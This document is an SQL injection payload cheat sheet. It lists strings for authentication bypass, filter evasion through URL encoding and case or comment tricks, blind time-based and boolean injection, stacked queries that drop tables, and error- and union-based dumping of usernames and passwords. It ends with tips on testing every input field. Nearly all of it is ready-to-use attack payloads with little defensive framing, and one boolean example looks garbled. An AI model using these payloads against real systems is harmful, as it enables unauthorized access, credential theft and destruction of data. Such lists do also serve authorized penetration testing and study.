Authentication Bypass: 
Common Payload:

' OR '1'='1' --  
' OR 1=1#  
admin' --  
admin'/*


Tautology-Based Injection:
Examples:

' OR 1=1 --  
' OR 'a'='a'


Comment-Based Injection:
Common Comments:

--  
#  
/*


Encoding-Based Bypass:
Circumvent Filters with encoding tricks.

Payload Encoding Types:

%27 (URL encoding ')
%2D%2D (encoding --)
Double encoding: %2527

Example:
%27%20OR%201%3D1--%20

Whitespace & Case Variation:
Bypasses filters using obfuscation

Examples:
UN/**/ION/**/SELECT  
SeLeCT * FrOm users

Spaces can be replace with:
Tabs \t
Comments /**/
Newlines \n

Blind SQL Injection: used when there's no visible error - only behavioral changes.

Boolean Based:
' AND 1-1 --

Time-Based (MYSQL):
' OR IF(1=1, SLEEP(5), 0) --

Tools like sqlmap excels here.


Stacked Queries:
Execute multiple SQL Commands in one line.
Payloads:

'; DROP TABLE users; --


Error-Based SQLI:
Forces DB to reveal internal errors.

Examples:
' AND 1=CONVERT(int, (SELECT @@version)) --  
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(user,0x3a,pass) FROM users GROUP BY 1) a) --


Union-Based Injection:
Merge queries and dump data.

Payloads:
' UNION SELECT null, username, password FROM users --

Use ORDER BY to find column count before using UNION.


Advanced Techniques:
Concatenation Bypass:
' OR 'a' + 'a'='aa' --  (MSSQL)


Version/DB info extraction:
' UNION SELECT version() --  (MySQL)  
' UNION SELECT @@version --  (MSSQL)

Final Notes:
Test all input fields (GET, POST, Cookies, Headers).
Use proxy tools to intercept and replay requests.
Always encode your payloads correctly.
Combine techniques creatively — no single payload fits all.
